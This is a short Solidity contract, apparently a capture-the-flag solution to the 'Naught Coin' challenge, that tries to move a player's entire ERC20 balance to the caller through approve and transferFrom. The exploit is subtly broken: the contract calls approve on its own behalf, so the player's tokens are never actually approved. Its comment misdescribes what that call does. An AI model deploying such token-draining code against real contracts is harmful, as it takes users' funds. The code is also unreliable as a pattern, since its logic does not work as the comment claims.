// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract NaughtCoinAttackerV2 {
    function executeExploit(address contractAddress, address playerAddress) external {
        IERC20 token = IERC20(contractAddress);
        uint256 playerBalance = token.balanceOf(playerAddress);
        // Approve tokens for spending
        token.approve(address(this), playerBalance);
        token.transferFrom(playerAddress, msg.sender, playerBalance);
    }
}